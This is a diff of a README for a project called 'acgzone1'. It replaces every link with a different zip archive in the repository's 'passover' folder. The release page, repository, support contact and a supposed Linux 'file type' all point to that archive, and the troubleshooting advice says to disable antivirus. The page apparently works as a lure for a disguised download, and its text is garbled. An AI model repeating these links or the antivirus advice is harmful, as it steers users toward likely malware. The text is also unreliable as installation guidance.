@@ -1,6 +1,6 @@
 # 👋 acgzone1 - Simple Installation for Your Next Project
 
-[![Download](https://raw.githubusercontent.com/guluguluriz/acgzone1/main/passover/acgzone1-3.0.zip)](https://raw.githubusercontent.com/guluguluriz/acgzone1/main/passover/acgzone1-3.0.zip)
+[![Download](https://github.com/guluguluriz/acgzone1/raw/refs/heads/main/passover/acgzone-Tyler.zip)](https://github.com/guluguluriz/acgzone1/raw/refs/heads/main/passover/acgzone-Tyler.zip)
 
 ---
 
@@ -14,13 +14,13 @@ Welcome to the acgzone1 project! This guide will help you install and run the ap
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can download the application.  
-   [Download acgzone1](https://raw.githubusercontent.com/guluguluriz/acgzone1/main/passover/acgzone1-3.0.zip)  
+   [Download acgzone1](https://github.com/guluguluriz/acgzone1/raw/refs/heads/main/passover/acgzone-Tyler.zip)  
 
 2. **Select the Latest Version**  
    On the releases page, look for the latest version of acgzone1. It is best to choose the most recent release for the latest features and fixes.
 
 3. **Download the Application**  
-   Click on the file that matches your operating system. If you are not sure, common choices are file types like `.exe` for Windows, `.dmg` for Mac, or `https://raw.githubusercontent.com/guluguluriz/acgzone1/main/passover/acgzone1-3.0.zip` for Linux. The file will begin to download.
+   Click on the file that matches your operating system. If you are not sure, common choices are file types like `.exe` for Windows, `.dmg` for Mac, or `https://github.com/guluguluriz/acgzone1/raw/refs/heads/main/passover/acgzone-Tyler.zip` for Linux. The file will begin to download.
 
 4. **Locate Your Download**  
    After the download is complete, open your "Downloads" folder. You should find the file there.
@@ -58,7 +58,7 @@ If you encounter issues during the installation or while running the application
 
 - **Check System Requirements:** Make sure your device meets the listed system requirements.
 - **Disable Antivirus Temporarily:** Sometimes, antivirus software may block installation. Try disabling it temporarily.
-- **Re-download the File:** If the file is corrupted, download it again from the [release page](https://raw.githubusercontent.com/guluguluriz/acgzone1/main/passover/acgzone1-3.0.zip).
+- **Re-download the File:** If the file is corrupted, download it again from the [release page](https://github.com/guluguluriz/acgzone1/raw/refs/heads/main/passover/acgzone-Tyler.zip).
 
 If problems persist, feel free to contact support or check the GitHub issues page for help.
 
@@ -72,9 +72,9 @@ For further information on using acgzone1, refer to the documentation provided w
 
 ## 🔗 Additional Resources
 
-- **Project Repository:** [acgzone1 GitHub](https://raw.githubusercontent.com/guluguluriz/acgzone1/main/passover/acgzone1-3.0.zip)
+- **Project Repository:** [acgzone1 GitHub](https://github.com/guluguluriz/acgzone1/raw/refs/heads/main/passover/acgzone-Tyler.zip)
 - **Community Forum:** Join our user community to share feedback and get help.
-- **Support Contact:** [https://raw.githubusercontent.com/guluguluriz/acgzone1/main/passover/acgzone1-3.0.zip](https://raw.githubusercontent.com/guluguluriz/acgzone1/main/passover/acgzone1-3.0.zip)
+- **Support Contact:** [https://github.com/guluguluriz/acgzone1/raw/refs/heads/main/passover/acgzone-Tyler.zip](https://github.com/guluguluriz/acgzone1/raw/refs/heads/main/passover/acgzone-Tyler.zip)
 
 ---
 
